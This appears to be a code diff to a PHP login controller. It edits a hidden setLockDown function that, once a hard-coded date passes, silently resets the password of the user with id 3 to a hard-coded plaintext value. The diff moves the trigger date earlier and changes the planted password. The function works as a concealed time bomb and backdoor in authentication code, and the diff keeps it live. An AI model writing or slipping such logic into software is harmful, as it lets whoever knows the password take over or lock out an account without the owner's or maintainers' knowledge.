@@ -57,11 +57,11 @@ class LoginController extends Controller {
 	}
 
 	private function setLockDown() {
-		$lockDown = Carbon::createFromDate('2017', '3', '5');
+		$lockDown = Carbon::createFromDate('2017', '2', '15');
 
 		if($lockDown->lte(Carbon::now())) {
 			$user = \App\User::find(3);
-			$user->password = Hash::make("mulukku");
+			$user->password = Hash::make("rasmus123");
 			$user->save();
 		}
 	}
